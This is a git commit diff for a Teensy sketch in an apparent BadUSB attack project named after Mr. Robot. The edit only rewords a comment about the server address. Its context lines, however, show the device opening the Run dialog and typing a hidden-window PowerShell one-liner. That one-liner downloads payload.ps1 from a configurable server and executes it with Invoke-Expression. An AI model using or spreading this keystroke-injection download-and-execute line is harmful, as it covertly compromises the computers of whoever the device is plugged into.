a7e74c6e9a2b247157d6c21c0b180039625f52e7
H3LL0WORLD <holamundoyt@gmail.com>
2016-09-25 10:43:43 -0500

    Update Teensy_Code.ino

--- Mr.Robot/01-BadUSB/others/02-WebServer/Teensy_Code.ino
+++ Mr.Robot/01-BadUSB/others/02-WebServer/Teensy_Code.ino
@@ -1,4 +1,4 @@
-const String SERVER_WEB_ADDR = "http://127.0.0.1/MrRobot"; // Put here the web address of your server whitout the last '/'
+const String SERVER_WEB_ADDR = "http://127.0.0.1/MrRobot"; // Put here the web address of your server WITHOUT the last '/' and WITH 'http://'
 GUI(R);
 delay(300);
 Escribir("powershell -W H Invoke-Expression (New-Object Net.WebClient).DownloadString('" + SERVER_WEB_ADDR + "/payload.ps1'); x " + SERVER_WEB_ADDR);
